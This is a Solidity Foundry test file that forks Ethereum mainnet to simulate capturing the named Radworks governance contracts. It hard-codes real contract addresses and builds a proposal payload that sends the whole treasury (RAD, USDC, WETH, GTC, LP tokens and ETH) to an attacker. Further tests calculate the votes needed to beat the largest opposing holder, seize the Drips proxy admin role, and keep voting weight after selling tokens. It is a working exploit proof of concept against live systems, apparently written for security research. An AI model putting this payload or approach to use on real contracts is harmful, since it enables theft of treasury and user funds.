// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
}

interface IVotesComp {
    function delegate(address) external;
    function getCurrentVotes(address) external view returns (uint96);
    function getPriorVotes(address, uint256) external view returns (uint96);
    function delegates(address) external view returns (address);
}

interface IGovernor {
    function propose(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        string memory description
    ) external returns (uint256);

    function castVote(uint256 proposalId, uint8 support) external returns (uint256);
    function cancel(uint256 proposalId) external;

    function queue(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        bytes32 descriptionHash
    ) external returns (uint256);

    function execute(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        bytes32 descriptionHash
    ) external payable returns (uint256);

    function state(uint256 proposalId) external view returns (uint8);
    function proposalSnapshot(uint256 proposalId) external view returns (uint256);
    function proposalDeadline(uint256 proposalId) external view returns (uint256);
    function proposalEta(uint256 proposalId) external view returns (uint256);
    function quorum(uint256 blockNumber) external view returns (uint256);
    function proposalThreshold() external view returns (uint256);
    function votingDelay() external view returns (uint256);
    function votingPeriod() external view returns (uint256);
    function timelock() external view returns (address);
    function hasVoted(uint256, address) external view returns (bool);
}

interface ITimelock {
    function admin() external view returns (address);
    function pendingAdmin() external view returns (address);
    function delay() external view returns (uint256);
    function GRACE_PERIOD() external view returns (uint256);
}

interface IUniswapV2Pair {
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function getReserves() external view returns (uint112, uint112, uint32);
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IManagedDrips {
    function admin() external view returns (address);
    function proposedAdmin() external view returns (address);
    function proposeNewAdmin(address newAdmin) external;
    function acceptAdmin() external;
}

contract RadworksCaptureTest is Test {
    address constant GOV = 0xD64D01D04498bFc60f04178e0B62a757C5048212;
    address constant TL = 0x8dA8f82d2BbDd896822de723F55D6EdF416130ba;
    address constant RAD = 0x31c8EAcBFFdD875c74b94b077895Bd78CF1E64A3;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant GTC = 0xDe30da39c46104798bB5aA3fe8B9e0e1F348163F;
    address constant PAIR = 0x8C1c499b1796D7F3C2521AC37186B52De024e58c;
    address constant DRIPS = 0x219dfbD6B0e414CCCb52C2e4d93160De99918456;

    uint256 constant FORK_BLOCK = 26_229_556;
    uint256 constant QUORUM = 4_000_000e18;
    uint256 constant THRESHOLD = 1_000_000e18;
    uint256 constant VOTING_DELAY = 7_200;
    uint256 constant VOTING_PERIOD = 17_280;
    uint256 constant TIMELOCK_DELAY = 172_800;

    address attacker = address(0xA11CE);
    address dripsHolder;

    function setUp() public {
        dripsHolder = makeAddr("dripsHolder");
        // Prefer an archive-capable RPC if available; never write the URL to disk.
        string memory rpc = vm.envOr("BLOCKPI_RPC_URL", string(""));
        if (bytes(rpc).length == 0) rpc = vm.envOr("NODEREAL_ETH_RPC_URL", string(""));
        if (bytes(rpc).length == 0) rpc = vm.envOr("FORK_RPC_URL", string(""));
        if (bytes(rpc).length == 0) rpc = "https://ethereum-rpc.publicnode.com";
        vm.createSelectFork(rpc, FORK_BLOCK);
    }

    function _setRadBalance(address who, uint256 amount) internal {
        // RadicleToken.balances is mapping(address => uint96) at storage slot 2.
        bytes32 slot = keccak256(abi.encode(who, uint256(2)));
        vm.store(RAD, slot, bytes32(amount));
        assertEq(IERC20(RAD).balanceOf(who), amount, "rad balance set");
    }

    function _payload(address recipient)
        internal
        view
        returns (address[] memory targets, uint256[] memory values, bytes[] memory calldatas)
    {
        targets = new address[](6);
        values = new uint256[](6);
        calldatas = new bytes[](6);

        targets[0] = RAD;
        calldatas[0] = abi.encodeWithSelector(IERC20.transfer.selector, recipient, IERC20(RAD).balanceOf(TL));
        targets[1] = USDC;
        calldatas[1] = abi.encodeWithSelector(IERC20.transfer.selector, recipient, IERC20(USDC).balanceOf(TL));
        targets[2] = WETH;
        calldatas[2] = abi.encodeWithSelector(IERC20.transfer.selector, recipient, IERC20(WETH).balanceOf(TL));
        targets[3] = GTC;
        calldatas[3] = abi.encodeWithSelector(IERC20.transfer.selector, recipient, IERC20(GTC).balanceOf(TL));
        targets[4] = PAIR;
        calldatas[4] = abi.encodeWithSelector(IERC20.transfer.selector, recipient, IERC20(PAIR).balanceOf(TL));
        targets[5] = recipient;
        values[5] = TL.balance;
        calldatas[5] = "";
    }

    function _runProposal(address proposer, uint256 proposeVotes, uint256 forVotes, uint256 againstVotes, string memory desc)
        internal
        returns (uint256 pid, bool succeeded)
    {
        // Give the proposer enough votes for the 1M threshold.
        if (proposeVotes > 0) {
            _setRadBalance(proposer, proposeVotes);
            vm.prank(proposer);
            IVotesComp(RAD).delegate(proposer);
        }

        // getPriorVotes(proposer, block.number - 1) is used by propose(); the delegation
        // checkpoint must be at least one block old.
        vm.roll(block.number + 1);

        (address[] memory targets, uint256[] memory values, bytes[] memory calldatas) = _payload(proposer);

        vm.prank(proposer);
        pid = IGovernor(GOV).propose(targets, values, calldatas, desc);

        vm.roll(IGovernor(GOV).proposalSnapshot(pid) + 1);

        if (forVotes > 0) {
            _setRadBalance(proposer, forVotes);
            vm.prank(proposer);
            IGovernor(GOV).castVote(pid, 1);
        }
        if (againstVotes > 0) {
            // The opponent's balance and delegation were set before propose(), so its
            // snapshot weight is already 7.1M. Just vote.
            vm.prank(dripsHolder);
            IGovernor(GOV).castVote(pid, 0);
        }

        vm.roll(IGovernor(GOV).proposalDeadline(pid) + 1);
        succeeded = IGovernor(GOV).state(pid) == 4; // Succeeded

        if (succeeded) {
            vm.prank(proposer);
            IGovernor(GOV).queue(targets, values, calldatas, keccak256(bytes(desc)));
            vm.warp(IGovernor(GOV).proposalEta(pid) + 1);
            vm.prank(proposer);
            IGovernor(GOV).execute(targets, values, calldatas, keccak256(bytes(desc)));
        }
    }

    function test_live_state() public view {
        assertEq(IGovernor(GOV).quorum(block.number - 1), QUORUM, "quorum");
        assertEq(IGovernor(GOV).proposalThreshold(), THRESHOLD, "threshold");
        assertEq(IGovernor(GOV).votingDelay(), VOTING_DELAY, "votingDelay");
        assertEq(IGovernor(GOV).votingPeriod(), VOTING_PERIOD, "votingPeriod");
        assertEq(IGovernor(GOV).timelock(), TL, "timelock");
        assertEq(ITimelock(TL).admin(), GOV, "timelock admin");
        assertEq(ITimelock(TL).pendingAdmin(), address(0), "pending admin");
        assertEq(ITimelock(TL).delay(), TIMELOCK_DELAY, "timelock delay");
        assertEq(IVotesComp(RAD).delegates(TL), address(0), "treasury undelegated");
        assertEq(IERC20(RAD).balanceOf(TL), 40_922_601_104_474_020_173_290_301, "treasury RAD");
        assertEq(IERC20(USDC).balanceOf(TL), 319_133_030_979, "treasury USDC");
        assertEq(IERC20(WETH).balanceOf(TL), 59_900_000_000_000_000_000, "treasury WETH");
        assertEq(IERC20(GTC).balanceOf(TL), 500_000e18, "treasury GTC");
        assertEq(IERC20(PAIR).balanceOf(TL), 1_198_749_348_279_279_609, "treasury LP");
        assertEq(IERC20(PAIR).totalSupply(), 1_198_800_123_004_279_322, "LP supply");
        (uint112 r0, uint112 r1,) = IUniswapV2Pair(PAIR).getReserves();
        assertEq(r0, 3_788_788_968_862_096_512_916_891, "pair RAD reserve");
        assertEq(r1, 1_079_531_009_208, "pair USDC reserve");
        assertEq(IVotesComp(RAD).getCurrentVotes(DRIPS), 7_105_352_110_000_000_000_000_000, "Drips votes");
    }

    function test_capture_with_quorum_only() public {
        uint256 radBefore = IERC20(RAD).balanceOf(TL);
        uint256 usdcBefore = IERC20(USDC).balanceOf(TL);
        uint256 wethBefore = IERC20(WETH).balanceOf(TL);
        uint256 gtcBefore = IERC20(GTC).balanceOf(TL);
        uint256 lpBefore = IERC20(PAIR).balanceOf(TL);

        (uint256 pid, bool ok) = _runProposal(attacker, QUORUM, QUORUM, 0, "hostile transfer");
        assertTrue(ok, "proposal succeeded");
        assertEq(IGovernor(GOV).state(pid), 7, "executed");

        // The timelock paid the attacker.
        assertEq(IERC20(RAD).balanceOf(attacker), QUORUM + radBefore, "attacker RAD");
        assertEq(IERC20(USDC).balanceOf(attacker), usdcBefore, "attacker USDC");
        assertEq(IERC20(WETH).balanceOf(attacker), wethBefore, "attacker WETH");
        assertEq(IERC20(GTC).balanceOf(attacker), gtcBefore, "attacker GTC");
        assertEq(IERC20(PAIR).balanceOf(attacker), lpBefore, "attacker LP");
        assertEq(IERC20(RAD).balanceOf(TL), 0, "timelock RAD drained");
        assertEq(TL.balance, 0, "timelock ETH drained");

        // Redeem the 99.996%-owned Uniswap V2 LP position.
        vm.startPrank(attacker);
        IERC20(PAIR).transfer(PAIR, lpBefore);
        (uint256 amount0, uint256 amount1) = IUniswapV2Pair(PAIR).burn(attacker);
        vm.stopPrank();

        assertApproxEqAbs(amount0, 3_788_788_968_862_096_512_916_891, 1_000e18, "LP RAD out");
        assertApproxEqAbs(amount1, 1_079_531_009_208, 200e6, "LP USDC out");
        console2.log("attacker RAD after LP redeem", IERC20(RAD).balanceOf(attacker));
        console2.log("attacker USDC after LP redeem", IERC20(USDC).balanceOf(attacker));
    }

    function test_drips_no_defeats_4m() public {
        _setRadBalance(dripsHolder, 7_105_352_110_000_000_000_000_000);
        vm.prank(dripsHolder);
        IVotesComp(RAD).delegate(dripsHolder);

        (uint256 pid, bool ok) = _runProposal(attacker, QUORUM, QUORUM, 7_105_352_110_000_000_000_000_000, "hostile transfer");
        assertFalse(ok, "4M cannot beat 7.1M No");
        assertEq(IGovernor(GOV).state(pid), 3, "defeated");
    }

    function test_7_2m_for_beats_drips() public {
        _setRadBalance(dripsHolder, 7_105_352_110_000_000_000_000_000);
        vm.prank(dripsHolder);
        IVotesComp(RAD).delegate(dripsHolder);

        uint256 attackVotes = 7_200_000e18;
        (uint256 pid, bool ok) = _runProposal(attacker, attackVotes, attackVotes, 7_105_352_110_000_000_000_000_000, "hostile transfer 7.2M");
        assertTrue(ok, "7.2M beats 7.1M No");
        assertEq(IGovernor(GOV).state(pid), 7, "executed");
    }

    function test_no_guardian_functions() public {
        (bool okGuardian,) = GOV.staticcall(abi.encodeWithSignature("guardian()"));
        (bool okVeto,) = GOV.staticcall(abi.encodeWithSignature("veto()"));
        (bool okCouncil,) = GOV.staticcall(abi.encodeWithSignature("securityCouncil()"));
        (bool okOwner,) = GOV.staticcall(abi.encodeWithSignature("owner()"));
        assertFalse(okGuardian, "no guardian()");
        assertFalse(okVeto, "no veto()");
        assertFalse(okCouncil, "no securityCouncil()");
        assertFalse(okOwner, "no owner()");
    }

    function test_third_party_cannot_cancel() public {
        _setRadBalance(attacker, QUORUM);
        vm.prank(attacker);
        IVotesComp(RAD).delegate(attacker);
        vm.roll(block.number + 1);

        (address[] memory targets, uint256[] memory values, bytes[] memory calldatas) = _payload(attacker);
        vm.prank(attacker);
        uint256 pid = IGovernor(GOV).propose(targets, values, calldatas, "cancel test");
        assertEq(IGovernor(GOV).state(pid), 0, "pending");

        vm.prank(address(0xBAD));
        vm.expectRevert();
        IGovernor(GOV).cancel(pid);
    }

    function test_drips_admin_handover() public {
        address DRIPS_PROXY = 0xd0Dd053392db676D57317CD4fe96Fc2cCf42D0b4;
        uint256 dripsUsdc = IERC20(USDC).balanceOf(DRIPS_PROXY);
        assertGt(dripsUsdc, 0, "Drips holds USDC");

        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        bytes[] memory calldatas = new bytes[](1);
        targets[0] = DRIPS_PROXY;
        calldatas[0] = abi.encodeWithSignature("proposeNewAdmin(address)", attacker);
        string memory desc = "drips admin handover";

        _setRadBalance(attacker, QUORUM);
        vm.prank(attacker);
        IVotesComp(RAD).delegate(attacker);
        vm.roll(block.number + 1);

        vm.prank(attacker);
        uint256 pid = IGovernor(GOV).propose(targets, values, calldatas, desc);
        vm.roll(IGovernor(GOV).proposalSnapshot(pid) + 1);
        vm.prank(attacker);
        IGovernor(GOV).castVote(pid, 1);
        vm.roll(IGovernor(GOV).proposalDeadline(pid) + 1);
        assertEq(IGovernor(GOV).state(pid), 4, "succeeded");

        vm.prank(attacker);
        IGovernor(GOV).queue(targets, values, calldatas, keccak256(bytes(desc)));
        vm.warp(IGovernor(GOV).proposalEta(pid) + 1);
        vm.prank(attacker);
        IGovernor(GOV).execute(targets, values, calldatas, keccak256(bytes(desc)));

        assertEq(IManagedDrips(DRIPS_PROXY).proposedAdmin(), attacker, "Drips admin proposed");
        vm.prank(attacker);
        IManagedDrips(DRIPS_PROXY).acceptAdmin();
        assertEq(IManagedDrips(DRIPS_PROXY).admin(), attacker, "attacker is Drips admin");
        // With admin rights the attacker can upgradeToAndCall() the ~$370k Drips TVL.
    }

    function test_snapshot_flip_still_votes() public {
        uint256 votes = QUORUM;
        _setRadBalance(attacker, votes);
        vm.prank(attacker);
        IVotesComp(RAD).delegate(attacker);

        vm.roll(block.number + 1);
        (address[] memory targets, uint256[] memory values, bytes[] memory calldatas) = _payload(attacker);
        vm.prank(attacker);
        uint256 pid = IGovernor(GOV).propose(targets, values, calldatas, "snapshot flip");

        uint256 snap = IGovernor(GOV).proposalSnapshot(pid);
        vm.roll(snap);

        // Sell the entire position after the snapshot is written. Voting starts at snap+1
        // and uses getPriorVotes(_, snap); the sale at snap+1 does not change the snapshot.
        vm.roll(snap + 1);
        vm.prank(attacker);
        IERC20(RAD).transfer(address(0xBEEF), votes);
        assertEq(IERC20(RAD).balanceOf(attacker), 0, "sold before voting");

        vm.prank(attacker);
        IGovernor(GOV).castVote(pid, 1);
        assertTrue(IGovernor(GOV).hasVoted(pid, attacker), "voted with snapshot weight");
        assertEq(IVotesComp(RAD).getPriorVotes(attacker, snap), votes, "prior votes still 4M");
    }
}
